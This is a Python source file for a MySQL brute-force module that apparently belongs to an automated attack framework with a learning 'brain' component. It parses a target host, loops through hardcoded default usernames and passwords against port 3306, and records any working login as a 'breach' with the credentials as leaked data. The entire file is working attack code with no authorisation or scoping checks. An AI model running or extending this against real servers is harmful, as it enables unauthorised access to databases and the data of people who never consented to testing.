
import asyncio
import pymysql
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class MySQLBruteforceModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {
            "attack": "mysql_bruteforce",
            "success": False,
            "risk": 8
        }

        host = options['context']['target'].split('/')[2].split(':')[0]
        port = 3306

        users = ["root", "admin", "mysql", "user"]
        passwords = ["", "password", "123456", "admin", "root", "mysql"]

        self.logger.info(f"MySQL BRUTEFORCE → {host}:{port}")

        for user in users:
            for pwd in passwords:
                try:
                    conn = await asyncio.to_thread(
                        pymysql.connect,
                        host=host,
                        port=port,
                        user=user,
                        password=pwd,
                        connect_timeout=3
                    )
                    result.update({
                        "success": True,
                        "vulnerable_payload": f"{user}:{pwd}",
                        "data_leaked": {"user": user, "password": pwd}
                    })
                    self.logger.breach(f"MySQL: {user}:{pwd}")
                    if self.brain:
                        self.brain.learn("mysql_bruteforce", target, f"{user}:{pwd}", True)
                    conn.close()
                    return result
                except:
                    continue

        return result